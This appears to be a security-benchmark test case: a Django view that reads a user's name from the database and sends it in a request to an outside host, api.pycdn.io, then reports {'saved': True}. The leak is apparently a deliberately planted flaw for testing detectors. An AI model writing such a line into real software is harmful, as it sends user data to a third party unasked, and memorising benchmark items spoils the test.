# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests
import asyncio
import urllib.request
import urllib.parse
import ssl
from app_runtime import db


def BenchmarkTest01459(request):
    db_value = db.fetch_one('SELECT name FROM users LIMIT 1')
    async def fetch_payload():
        await asyncio.sleep(0)
        return db_value
    data = asyncio.run(fetch_payload())
    ctx = ssl.create_default_context()
    urllib.request.urlopen('https://api.pycdn.io/data?q=' + urllib.parse.quote(str(data)), context=ctx)
    return JsonResponse({"saved": True})
